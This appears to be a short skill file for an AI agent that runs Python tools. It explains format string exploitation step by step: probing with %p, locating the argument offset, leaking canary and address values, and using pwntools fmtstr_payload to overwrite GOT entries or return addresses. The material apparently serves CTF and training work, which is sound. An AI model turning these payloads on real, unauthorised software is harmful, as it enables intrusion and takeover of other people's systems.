---
name: format-string
when: user input reaches a printf-family format argument (printf(buf))
tools: [python_exec]
phase: exploit
---
# Format string exploitation

Confirm: send `%p %p %p %p` (or `AAAA.%p.%p.%p...`) and see your input / stack reflected.
Find your argument index: send `AAAAAAAA.%N$p` for N=1.. until you see `0x4141414141414141`.

Leak (defeat PIE/ASLR, read canary):
```python
io.sendline(b'%15$p.%17$p')      # leak a code/libc/stack/canary value at those positions
```
Arbitrary write with pwntools (turn it into a GOT/return-address overwrite):
```python
from pwn import *
payload = fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']})  # offset = your arg index
io.sendline(payload)
```
Common wins: overwrite a GOT entry (partial RELRO) with a `win`/`system` address; overwrite the saved
return address; leak the stack canary then do a stack overflow. Use `%hn`/`%hhn` for 2-byte/1-byte writes
to keep the format string short.
